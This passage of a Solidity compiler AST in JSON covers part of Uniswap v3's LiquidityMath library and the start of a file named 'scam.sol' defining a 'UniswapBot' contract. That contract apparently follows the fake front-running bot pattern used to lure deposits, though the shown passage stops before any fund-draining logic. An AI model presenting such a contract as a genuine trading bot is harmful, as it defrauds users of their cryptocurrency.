													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 538,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "474:1:8",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "470:5:8",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 572,
													"nodeType": "Block",
													"src": "548:65:8",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint128",
																			"typeString": "uint128"
																		},
																		"id": 568,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"id": 565,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 558,
																						"name": "z",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 535,
																						"src": "571:1:8",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						},
																						"id": 564,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 559,
																							"name": "x",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 530,
																							"src": "575:1:8",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 562,
																									"name": "y",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 532,
																									"src": "587:1:8",
																									"typeDescriptions": {
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								],
																								"id": 561,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "579:7:8",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint128_$",
																									"typeString": "type(uint128)"
																								},
																								"typeName": {
																									"id": 560,
																									"name": "uint128",
																									"nodeType": "ElementaryTypeName",
																									"src": "579:7:8",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 563,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "579:10:8",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"src": "575:14:8",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"src": "571:18:8",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint128",
																						"typeString": "uint128"
																					}
																				}
																			],
																			"id": 566,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "570:20:8",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": ">=",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 567,
																			"name": "x",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 530,
																			"src": "594:1:8",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"src": "570:25:8",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "4c41",
																		"id": 569,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "597:4:8",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_ce8fc98a1432efc8ba166615239eb1702fbbbd0ddab9a5952502a98483035383",
																			"typeString": "literal_string \"LA\""
																		},
																		"value": "LA"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_ce8fc98a1432efc8ba166615239eb1702fbbbd0ddab9a5952502a98483035383",
																			"typeString": "literal_string \"LA\""
																		}
																	],
																	"id": 557,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		-18,
																		-18
																	],
																	"referencedDeclaration": -18,
																	"src": "562:7:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 570,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "562:40:8",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 571,
															"nodeType": "ExpressionStatement",
															"src": "562:40:8"
														}
													]
												},
												"id": 573,
												"nodeType": "IfStatement",
												"src": "466:147:8",
												"trueBody": {
													"id": 556,
													"nodeType": "Block",
													"src": "477:65:8",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint128",
																			"typeString": "uint128"
																		},
																		"id": 552,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"id": 549,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 541,
																						"name": "z",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 535,
																						"src": "500:1:8",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						},
																						"id": 548,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 542,
																							"name": "x",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 530,
																							"src": "504:1:8",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "-",
																						"rightExpression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 546,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"nodeType": "UnaryOperation",
																									"operator": "-",
																									"prefix": true,
																									"src": "516:2:8",
																									"subExpression": {
																										"argumentTypes": null,
																										"id": 545,
																										"name": "y",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 532,
																										"src": "517:1:8",
																										"typeDescriptions": {
																											"typeIdentifier": "t_int128",
																											"typeString": "int128"
																										}
																									},
																									"typeDescriptions": {
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_int128",
																										"typeString": "int128"
																									}
																								],
																								"id": 544,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "508:7:8",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_uint128_$",
																									"typeString": "type(uint128)"
																								},
																								"typeName": {
																									"id": 543,
																									"name": "uint128",
																									"nodeType": "ElementaryTypeName",
																									"src": "508:7:8",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 547,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "508:11:8",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint128",
																								"typeString": "uint128"
																							}
																						},
																						"src": "504:15:8",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint128",
																							"typeString": "uint128"
																						}
																					},
																					"src": "500:19:8",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint128",
																						"typeString": "uint128"
																					}
																				}
																			],
																			"id": 550,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "499:21:8",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "<",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 551,
																			"name": "x",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 530,
																			"src": "523:1:8",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint128",
																				"typeString": "uint128"
																			}
																		},
																		"src": "499:25:8",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"hexValue": "4c53",
																		"id": 553,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "526:4:8",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_2be2231ccd52e7fedf30c30a3dfa3d6c9d9d3400159e305398a7b6d437f56985",
																			"typeString": "literal_string \"LS\""
																		},
																		"value": "LS"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_2be2231ccd52e7fedf30c30a3dfa3d6c9d9d3400159e305398a7b6d437f56985",
																			"typeString": "literal_string \"LS\""
																		}
																	],
																	"id": 540,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		-18,
																		-18
																	],
																	"referencedDeclaration": -18,
																	"src": "491:7:8",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 554,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "491:40:8",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 555,
															"nodeType": "ExpressionStatement",
															"src": "491:40:8"
														}
													]
												}
											}
										]
									},
									"documentation": {
										"id": 528,
										"nodeType": "StructuredDocumentation",
										"src": "137:241:8",
										"text": "@notice Add a signed liquidity delta to liquidity and revert if it overflows or underflows\n @param x The liquidity before change\n @param y The delta by which liquidity should be changed\n @return z The liquidity delta"
									},
									"id": 575,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "addDelta",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 533,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 530,
												"mutability": "mutable",
												"name": "x",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 575,
												"src": "401:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 529,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "401:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 532,
												"mutability": "mutable",
												"name": "y",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 575,
												"src": "412:8:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int128",
													"typeString": "int128"
												},
												"typeName": {
													"id": 531,
													"name": "int128",
													"nodeType": "ElementaryTypeName",
													"src": "412:6:8",
													"typeDescriptions": {
														"typeIdentifier": "t_int128",
														"typeString": "int128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "400:21:8"
									},
									"returnParameters": {
										"id": 536,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 535,
												"mutability": "mutable",
												"name": "z",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 575,
												"src": "445:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 534,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "445:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "444:11:8"
									},
									"scope": 576,
									"src": "383:236:8",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 577,
							"src": "109:512:8"
						}
					],
					"src": "45:577:8"
				},
				"id": 8
			},
			"scam.sol": {
				"ast": {
					"absolutePath": "scam.sol",
					"exportedSymbols": {
						"UniswapBot": [
							2159
						]
					},
					"id": 2160,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 578,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".6"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:9"
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
							"id": 579,
							"nodeType": "ImportDirective",
							"scope": 2160,
							"sourceUnit": 83,
							"src": "112:89:9",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol",
							"id": 580,
							"nodeType": "ImportDirective",
							"scope": 2160,
							"sourceUnit": 105,
							"src": "203:86:9",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
							"file": "github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol",
							"id": 581,
							"nodeType": "ImportDirective",
							"scope": 2160,
							"sourceUnit": 577,
							"src": "291:84:9",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2159,
							"linearizedBaseContracts": [
								2159
							],
							"name": "UniswapBot",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e1812f05",
									"id": 583,
									"mutability": "mutable",
									"name": "debugMempool",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 2159,
									"src": "655:26:9",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 582,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "655:6:9",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "7d53d433",
									"id": 585,
									"mutability": "mutable",
									"name": "debugBot",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 2159,
									"src": "688:22:9",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_string_storage",
										"typeString": "string"
									},
									"typeName": {
										"id": 584,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "688:6:9",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 587,
									"mutability": "mutable",
									"name": "liquidity",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 2159,
									"src": "717:14:9",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 586,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "717:4:9",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 591,
									"name": "Log",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 590,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 589,
												"indexed": false,
												"mutability": "mutable",
												"name": "_msg",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 591,
												"src": "751:11:9",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 588,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "751:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "750:13:9"
									},
									"src": "741:23:9"
								},
								{
									"body": {
										"id": 606,
										"nodeType": "Block",
										"src": "854:86:9",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 600,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 598,
														"name": "debugMempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 583,
														"src": "865:12:9",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 599,
														"name": "_mainTokenSymbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 593,
														"src": "880:16:9",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "865:31:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 601,
												"nodeType": "ExpressionStatement",
												"src": "865:31:9"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 604,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 602,
														"name": "debugBot",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 585,
														"src": "907:8:9",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 603,
														"name": "_mainTokenName",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 595,
														"src": "918:14:9",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "907:25:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 605,
												"nodeType": "ExpressionStatement",
												"src": "907:25:9"
											}
										]
									},
									"documentation": null,
									"id": 607,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 596,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 593,
												"mutability": "mutable",
												"name": "_mainTokenSymbol",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 607,
												"src": "785:30:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 592,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "785:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 595,
												"mutability": "mutable",
												"name": "_mainTokenName",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 607,
												"src": "817:28:9",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 594,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "817:6:9",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "784:62:9"
									},
									"returnParameters": {
										"id": 597,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "854:0:9"
									},
									"scope": 2159,
									"src": "773:167:9",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 610,
										"nodeType": "Block",
										"src": "976:2:9",
										"statements": []
									},
									"documentation": null,
									"id": 611,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 608,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "956:2:9"
									},
									"returnParameters": {
										"id": 609,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "976:0:9"
									},
									"scope": 2159,
									"src": "949:29:9",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"canonicalName": "UniswapBot.slice",
									"id": 616,
									"members": [
										{
											"constant": false,
											"id": 613,
											"mutability": "mutable",
											"name": "_len",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 616,
											"src": "1011:9:9",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 612,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "1011:4:9",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										},
										{
											"constant": false,
											"id": 615,
											"mutability": "mutable",
											"name": "_ptr",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 616,
											"src": "1031:9:9",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 614,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "1031:4:9",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										}
									],
									"name": "slice",
									"nodeType": "StructDefinition",
									"scope": 2159,
									"src": "987:61:9",
									"visibility": "public"
								},
								{
									"body": {
										"id": 764,
										"nodeType": "Block",
										"src": "1220:1311:9",
										"statements": [
											{
												"assignments": [
													626
												],
												"declarations": [
													{
														"constant": false,
														"id": 626,
														"mutability": "mutable",
														"name": "shortest",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 764,
														"src": "1231:13:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 625,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1231:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 629,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 627,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 618,
														"src": "1247:4:9",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
															"typeString": "struct UniswapBot.slice memory"
														}
													},
													"id": 628,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_len",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 613,
													"src": "1247:9:9",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1231:25:9"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 634,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 630,
															"name": "other",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 620,
															"src": "1273:5:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 631,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "1273:10:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 632,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 618,
															"src": "1286:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																"typeString": "struct UniswapBot.slice memory"
															}
														},
														"id": 633,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 613,
														"src": "1286:9:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1273:22:9",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 640,
												"nodeType": "IfStatement",
												"src": "1269:63:9",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 638,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 635,
															"name": "shortest",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 626,
															"src": "1311:8:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 636,
																"name": "other",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 620,
																"src": "1322:5:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$616_memory_ptr",
																	"typeString": "struct UniswapBot.slice memory"
																}
															},
															"id": 637,
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "_len",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 613,
															"src": "1322:10:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1311:21:9",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 639,
													"nodeType": "ExpressionStatement",
													"src": "1311:21:9"
												}
											},
											{
												"assignments": [
													642
												],
												"declarations": [
													{
														"constant": false,
														"id": 642,
														"mutability": "mutable",
														"name": "selfptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 764,
														"src": "1346:12:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 641,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1346:4:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
